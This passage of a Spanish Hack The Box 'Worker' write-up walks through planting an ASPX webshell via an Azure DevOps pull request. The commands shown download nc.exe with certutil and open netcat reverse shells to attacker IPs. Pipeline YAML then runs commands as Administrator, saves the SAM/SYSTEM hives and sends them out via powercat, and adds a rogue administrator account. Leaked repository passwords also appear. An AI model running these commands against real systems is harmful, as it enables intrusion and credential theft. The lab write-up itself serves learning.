+Desempaquetando objetos: 100% (96/96), 2.06 MiB | 828.00 KiB/s, listo.
+
+–» ls lens/
+assets  images  index.html  LICENSE.txt  README.txt
+</code></pre>
+
+<p>Ahora agregamos el archivo, hacemos el commit y el push.</p>
+
+<blockquote>
+  <p>Usaremos <code>.aspx</code>: La extensión de archivo ASPX se utiliza para páginas web que son generadas automáticamente por el servidor y dirigen directamente a un servidor activo. Se asocian habitualmente con la infraestructura Microsoft ASP.NET. Este formato web puede abrirse en cualquier navegador web si la URL finaliza con la extensión ASPX. <a href="https://www.online-convert.com/es/formato-de-archivo/aspx">Online ASPX</a></p>
+</blockquote>
+
+<ul>
+  <li><a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">Encontré esta webshell sencilla</a>.</li>
+</ul>
+
+<pre><code class="language-bash">–» vim candelapura.aspx 
+–» git add .
+–» git commit -m "Quemando esto"
+[master 014fedf] Quemando esto
+–» git push
+Username for 'http://devops.worker.htb': nathen
+Password for 'http://nathen@devops.worker.htb': 
+Enumerando objetos: 7, listo.
+Contando objetos: 100% (7/7), listo.
+Comprimiendo objetos: 100% (4/4), listo.
+Escribiendo objetos: 100% (4/4), 506 bytes | 506.00 KiB/s, listo.
+Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0
+remote: Analyzing objects... (4/4) (6 ms)
+remote: Storing packfile... done (23 ms)
+remote: Storing index... done (31 ms)
+To http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
+ ! [remote rejected] master -&gt; master (TF402455: Pushes to this branch are not permitted; you must use a pull request to update this branch.)
+error: falló el push de algunas referencias a 'http://devops.worker.htb/ekenas/SmartHotel360/_git/lens'
+</code></pre>
+
+<p>Obtenemos el error (: Ahora procedemos a crear una nueva rama:</p>
+
+<pre><code class="language-bash">–» git checkout -b feature/patestpa 
+Cambiado a nueva rama 'feature/patestpa'
+–» git push
+fatal: La rama actual feature/patestpa no tiene una rama upstream.
+Para realizar un push de la rama actual y configurar el remoto como upstream, use
+
+        git push --set-upstream origin feature/patestpa
+
+–» git push --set-upstream origin feature/patestpa
+Username for 'http://devops.worker.htb': nathen
+Password for 'http://nathen@devops.worker.htb': 
+Enumerando objetos: 7, listo.
+Contando objetos: 100% (7/7), listo.
+Comprimiendo objetos: 100% (4/4), listo.
+Escribiendo objetos: 100% (4/4), 506 bytes | 506.00 KiB/s, listo.
+Total 4 (delta 2), reusado 1 (delta 0), pack-reusado 0
+remote: Analyzing objects... (4/4) (5 ms)
+remote: Storing packfile... done (33 ms)
+remote: Storing index... done (43 ms)
+To http://devops.worker.htb/ekenas/SmartHotel360/_git/lens
+   a306cfe..014fedf  feature/patestpa -&gt; feature/patestpa
+Rama 'feature/patestpa' configurada para hacer seguimiento a la rama remota 'feature/patestpa' de 'origin'.
+</code></pre>
+
+<p>Listo, ahora vamos para la web y creamos el <code>pull request</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq1.png" alt="270pagedevopspullreq1" /></p>
+
+<p>Damos clic en <code>create a pull request</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq2.png" alt="270pagedevopspullreq2" /></p>
+
+<p>Ahora en <code>Create</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopspullreq3.png" alt="270pagedevopspullreq3" /></p>
+
+<p>En esta pagina debemos hacer 3 cosas (que son las que a la derecha estan con un chulo ya), de esas controlamos 2:</p>
+
+<ul>
+  <li>Dar al boton <code>Approve</code>.</li>
+  <li>Agregar un <code>Work Item</code>, yo agregue cualquiera :P</li>
+</ul>
+
+<p>Damos clic en <code>Complete</code> y despues en <code>Complete Merge</code>, verifiquemos la estructura de archivos ahora:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopscandelafiledone.png" alt="270pagedevopscandelafiledone" /></p>
+
+<p>Ahora si el archivo esta en la raiz del repo, entonces podremos ingresar a el mediante la siguente url: <code>http://lens.worker.htb/candelapura.aspx</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopswebshell.png" alt="270pagedevopswebshell" /></p>
+
+<p>Perfectooooooooooooooooooooo, ahora podriamos subir el binario <code>netcat</code>, para mediante <code>certutil.exe</code> o <code>PowerShell</code> subirlo a la maquina y despues usarlo para entablarnos una reverse shell, a ver:</p>
+
+<pre><code class="language-powershell">#Web
+/c dir c:\Windows\Temp
+
+#Attack machine
+–» ls
+lens  nc.exe  repository_copy
+–» python -m SimpleHTTPServer
+
+#Web
+/c certutil.exe -f -split -urlcache http://10.10.14.161:8000/nc.exe c:\Windows\Temp\nc.exe
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevopswebshellupnc.png" alt="270pagedevopswebshellupnc" /></p>
+
+<pre><code class="language-powershell">#Web
+/c c:\Windows\Temp\nc.exe 10.10.14.161 4433 -e cmd.exe
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270bashrevsh1done.png" alt="270bashrevsh1done" /></p>
+
+<p>Opa, tamos dentro compadreeee (: Lindo lindo, bueno a ver como podemos cambiar de usuario.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p><strong>Acá fui un fracaso como enumerador</strong> :P, enumere y enumere y me perdí demasiado, use <code>Winpeas</code> y no encontré nada… Seguí enumerando hasta que ya no sabía hacia donde mirar… Buscando ayuda, <a href="https://s0s4.gitlab.io/">Sosa</a> me indico que volviera a revisar <code>Winpeas</code> pero encofado en los discos… Y pues:</p>
+
+<pre><code class="language-powershell">  [+] Drives Information
+   [?] Remember that you should search more info inside the other drives 
+    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [AppendData/CreateDirectories])
+    W:\ (Type: Fixed)(Volume label: Work)(Filesystem: NTFS)(Available space: 16 GB)(Permissions: Users [AppendData/CreateDirectories])
+</code></pre>
+
+<p>:I Tenemos otro disco :(:, <code>W:\</code>. Veamoslo:</p>
+
+<pre><code class="language-powershell">PS C:\Windows\Temp&gt; cd w:\
+cd w:\
+PS W:\&gt; dir
+dir
+
+
+    Directory: W:\
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       2020-06-16     18:59                agents                                                                
+d-----       2020-03-28     14:57                AzureDevOpsData                                                       
+d-----       2020-04-03     11:31                sites                                                                 
+d-----       2020-06-20     16:04                svnrepos                                                              
+
+
+PS W:\&gt; 
+</code></pre>
+
+<p>Enumeremos en el a ver que encontramos.</p>
+
+<pre><code class="language-powershell">PS W:\svnrepos\www\conf&gt; dir
+dir
+
+
+    Directory: W:\svnrepos\www\conf
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       2020-06-20     11:29           1112 authz                                                                 
+-a----       2020-06-20     11:29            904 hooks-env.tmpl                                                        
+-a----       2020-06-20     15:27           1031 passwd                                                                
+-a----       2020-04-04     20:51           4454 svnserve.conf
+</code></pre>
+
+<p>Revisando el archivo <code>passwd</code>, tenemos:</p>
+
+<pre><code>...
+nathen = wendel98  
+nichin = fqerfqerf
+nichin = asifhiefh  
+noahip = player      
+...
+quehub = pickme 
+quihud = kindasecure
+...
+rhiire = users
+riairv = canyou
+ricisa = seewhich
+robish = onesare
+robisl = wolves11
+robive = andwhich
+ronkay = onesare
+...
+sapket = hamburger
+sarkil = friday
+</code></pre>
+
+<p>Usuarios del repositorio. Si nos fijamos tenemos a <code>robisl = wolves11</code>, el cual es un usuario tambien del sistema. Probemos a entrar a la pagina con ese usuario.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_log.png" alt="270pagedevo_rob_log" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_files.png" alt="270pagedevo_rob_files" /></p>
+
+<p>En este caso no podríamos repetir lo que hicimos con <code>nathen</code>, ya que acá no sabemos donde está alojado el servicio <code>PartsUnlimited</code>. No tenemos dominio ni nada como para probar a ver los archivos despues de ser subidos. Así que si recordamos lo que se intentó al inicio de la máquina, cuando estábamos jugando a “que hacer” como <code>nathen</code>, encontramos los <code>pipeline</code>, que con ellos podemos generar tareas que se ejecuten en el repositorio.</p>
+
+<p>Pero también podemos indicarle que queremos ejecutar algún comando o tarea en el sistema:</p>
+
+<ul>
+  <li><a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/tasks/utility/command-line?view=azure-devops&amp;tabs=yaml">Docs.microsoft - Azure Pipelines (Command Line Task)</a>.</li>
+  <li><a href="https://geeks.ms/jorge/2019/02/28/como-ejecutar-en-el-pipeline-de-azure-devops-una-tarea-personalizada/">Geeks.ms - Tarea personalizada Azure Pipelines</a>.</li>
+</ul>
+
+<blockquote>
+  <p>Para hacer esto dependemos de <a href="https://fercontreras.com/conoce-que-es-un-yaml-e18e9d21ade4">YAML (YAML Ain’t Markup Language)</a>. Básicamente es un formato que permite guardar datos de manera demasiado legible.</p>
+</blockquote>
+
+<p>Si seguimos <a href="https://geeks.ms/jorge/2019/02/28/como-ejecutar-en-el-pipeline-de-azure-devops-una-tarea-personalizada/">esta guia</a>, logramos esto:</p>
+
+<p>Primero creemos el <code>Pipeline</code>, le indicamos que queremos que ejecute en el sistema y validamos.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe.png" alt="270pagedevo_rob_createpipe" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe2.png" alt="270pagedevo_rob_createpipe2" /></p>
+
+<p>Seleccionamos <code>Azure Repos Git</code> y despues el repositorio, en este caso <code>PartsUnlimited</code>:</p>
+
+<p>En <strong>Configure</strong> bajamos y seleccionamos <code>Starter Pipeline</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe3.png" alt="270pagedevo_rob_createpipe3" /></p>
+
+<p>Y obtenemos nuestro archivo:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe4.png" alt="270pagedevo_rob_createpipe4" /></p>
+
+<p>Ahora podemos modificar la estructura, agreguemos una linea que nos ejecute <code>whoami</code>:</p>
+
+<pre><code class="language-yml">trigger:
+- master
+
+pool: 'Default'
+
+steps:
+- script: 'whoami'
+
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+  displayName: 'Run a multi-line script'
+</code></pre>
+
+<p>Damos clic en <code>Save and run</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe5.png" alt="270pagedevo_rob_createpipe5" /></p>
+
+<p>Despues le indicamos que nos cree una nueva rama, ya que si intentamos hacerlo directamente en la <code>master</code> no nos deja y damos en <code>Save and run</code>, pero nos dice que no encuentra el <code>Pool</code> llamado <code>Default</code>. Validando <a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops&amp;tabs=yaml%2Cbrowser">donde encontrar que <code>Pool</code>’s hay en el sistema</a> tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe6agent.png" alt="270pagedevo_rob_createpipe6agent" /></p>
+
+<p>Un <code>Pool</code> llamado <code>Setup</code> que su creador o el que lo maneja es el usuario <code>Administrator</code>. Lo cual es interesante porque pueda que lo que ejecutemos mediante el archivo <code>YAML</code> se esté ejecutando como usuario administrador. Sigamos viendo a ver si solucionamos el error.</p>
+
+<p>Cambiamos simplemente:</p>
+
+<pre><code class="language-yml">...
+pool: 'Setup'
+...
+</code></pre>
+
+<p><strong>Save and run</strong> &gt; <strong>Save and run</strong>…</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createpipe7.png" alt="270pagedevo_rob_createpipe7" /></p>
+
+<p>Y si revisamos la tarea que se llama <code>CmdLine</code> tenemos la respuesta del sistema:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_pipewhoami.png" alt="270pagedevo_rob_pipewhoami" /></p>
+
+<p>Perfecto, tenemos ejecución de comandos en el sistema como administrador… Entablemos una reverse shell (:</p>
+
+<pre><code class="language-yml">trigger:
+- master
+
+pool: 'Setup'
+
+steps:
+- script: 'certutil.exe -f -urlcache -split http://10.10.14.202:8000/nc.exe c:\Windows\Temp\nc.exe'
+
+- script: 'c:\Windows\Temp\nc.exe 10.10.14.202 4434 -e cmd.exe'
+
+- script: echo Hello, world!
+  displayName: 'Run a one-line script'
+
+- script: |
+    echo Add other tasks to build, test, and deploy your project.
+    echo See https://aka.ms/yaml
+  displayName: 'Run a multi-line script'
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_piperevshell.png" alt="270pagedevo_rob_piperevshell" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_revshell.png" alt="270pagedevo_rob_revshell" /></p>
+
+<p>Se ejecuta la conexión para subir el binario <code>nc.exe</code> yyy tambien entabla la comunicación para generar la reverse Shell… Muestra cancelado, pero <code>netcat</code> ya hizo su tarea… El <code>cancelado</code> es debido a que la conexión queda abierta como en “espera”, entonces deben tener algún tipo de timeout para cancelar la tarea y que no se quede esperando alguna respuesta.</p>
+
+<p><strong>Tenemos un problema, ¿cuál es?… Nos cierra la conexión :P</strong></p>
+
+<p>(Básicamente desde la web podría indicarle que me muestre los hashes md5 de cada flag: <code>user.txt</code> y <code>root.txt</code>, pero quiero tener una Shell como Administrador)</p>
+
+<p>Estuve mucho tiempo dándole, intentando, quemándome la cabeza, cambiando cosas, creando branches, etc. :’) Pero no logre ejecutar la reverse Shell, intente:</p>
+
+<ul>
+  <li>con <strong>PowerShell</strong> (en YAML <code>- powershell: ...</code> y junto a <code>- script: powershell ...</code></li>
+  <li>tambien <code>/c</code> para que apenas ejecute el comando, cierre el proceso, más no la conexión.</li>
+  <li>en algunos sitios indicaban ponerle <code>&amp;</code> al final de la línea para hacer que la tarea se corra de fondo.</li>
+  <li>YAML tiene unos argumentos enfocados a tareas (<code>jobs</code>), tambien intente con ellos pero nada.</li>
+  <li>Con <code>start</code> y <code>start /B</code> para ejecutar el comando y mantenerlo en el background.</li>
+</ul>
+
+<p>Nada de nada.</p>
+
+<p>Pensé en transferirme los hashes <code>SAM</code> y <code>SYSTEM</code> para posteriormente dumpearlos con <code>pwdump</code> y después usar <code>pth-winexe</code> para ingresar a la máquina con el usuario Administrator. Pero después de todo el proceso, los hashes presuntamente estaban mal y el <code>pth-winexe</code> no me daba ningún output. En breves pasos lo que hice fue:</p>
+
+<pre><code class="language-yml">trigger:
+- master
+
+pool: 'Setup'
+
+steps:
+#Guardamos registros en archivos:
+- script: reg save HKLM\SAM c:\Windows\Temp\sam
+- script: reg save HKLM\SYSTEM c:\Windows\Temp\system
+
+#Los transferimos a nuestra maquina: (Levantamos un servidor con python y nos ponemos en escucha por dos puertos [nc -lvp 4435 &gt; sam])
+#Buscando y preguntando encontre esta linda herramienta (powercat):
+- script: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.202:8000/powercat.ps1');powercat -c 10.10.14.202 -p 4435 -i c:\Windows\Temp\sam"
+- script: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.202:8000/powercat.ps1');powercat -c 10.10.14.202 -p 4436 -i c:\Windows\Temp\system"
+
+#Tuvimos que ejecutar cada powercat en un pipeline diferente, el timeout no dejaba pasar de uno a otro.
+</code></pre>
+
+<p>Con los archivos en nuestra maquina hacemos:</p>
+
+<pre><code class="language-bash">–» pwdump sam system
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+aaralf:1019:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+abrall:1020:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+aceals:1021:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+...
+</code></pre>
+
+<p>Todos son iguales (?) (:</p>
+
+<p>…</p>
+
+<p>En este punto no sabría como obtener una Shell como el usuario <code>nt autority\system</code>.</p>
+
+<p>Probemos a crear un usuario y lo asignamos al grupo administradores mediante la web. (Tambien podemos entrar a la máquina mediante el puerto WinRM (5895) con el usuario <code>robisl</code>).</p>
+
+<pre><code class="language-bash">–» evil-winrm -i 10.10.10.203 -u 'robisl' -p 'wolves11' 
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\robisl\Documents&gt; whoami;hostname
+worker\robisl
+Worker
+</code></pre>
+
+<p>Ahora sí, intentemos agregar el usuario (: Si no me deja, podríamos agregar a <code>robisl</code> al grupo de Administradores, pero esa idea no me gusta, igual al final les dejaría la línea que deberíamos ejecutar).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createuseryml.png" alt="270pagedevo_rob_createuseryml" /></p>
+
+<ul>
+  <li>carlitosway : casl0$3lw@y</li>
+</ul>
+
+<blockquote>
+  <p>(Me di cuenta que puse caslos :P)</p>
+</blockquote>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_createuserdone.png" alt="270pagedevo_rob_createuserdone" /></p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\robisl\Documents&gt; net user carlitosway
+User name                    carlitosway
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-12-03 01:09:07
+Password expires             2021-01-14 01:09:07
+Password changeable          2020-12-03 01:09:07
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Users
+Global Group memberships     *None
+
+*Evil-WinRM* PS C:\Users\robisl\Documents&gt; 
+</code></pre>
+
+<p>Listo, ahora lo agregamos al grupo de administradores.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270pagedevo_rob_addusergroup.png" alt="270pagedevo_rob_addusergroup" /></p>
+
+<p><strong>Save and run</strong> &gt; <strong>Save and run</strong>:</p>
+
+<pre><code class="language-powershell">*Evil-WinRM* PS C:\Users\robisl\Documents&gt; net user carlitosway
+User name                    carlitosway
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            2020-12-03 01:09:07
+Password expires             2021-01-14 01:09:07
+Password changeable          2020-12-03 01:09:07
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Users
+Global Group memberships     *None
+
+*Evil-WinRM* PS C:\Users\robisl\Documents&gt; 
+</code></pre>
+
+<p>Yyyyy</p>
+
+<pre><code class="language-bash">–» evil-winrm -i 10.10.10.203 -u 'carlitosway' -p 'casl0$3lw@y' 
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt; whoami
+worker\carlitosway
+*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt; ls c:\Users\Administrator\Desktop
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        12/2/2020   6:26 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\carlitosway\Documents&gt;
+</code></pre>
+
+<p>Perfectooooooooooooooooooooooooooooooooooooooo. Somos administradores del sistemaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa (: Que lindooooooooooooooo…</p>
+
+<p>Lo unico que nos queda es ver las flags:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/worker/270flags.png" alt="270flags" /></p>
+
+<p>…</p>
+
+<p>Que locura de máquina, muy linda, me gusto mucho el jugar con repositorios, branch y usuarios así, lindo. Hubo dos momentos en que me destruí, ya que no sabía hacia donde mirar, pero bueno, se sobrepasaron los problemas y logramos rootearla. El poder ejecutar comandos tan fácil y como administradores da mucho que pensar, ¿no?… ¿no o.O?</p>
+
+<p>Muchas gracias por leer y a seguir rompiendo todo (:</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=HackTheBox - Worker&url=http://localhost:4000/htb/worker" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#devOps">devOps</a>               
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#repositories">repositories</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#htb">htb</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
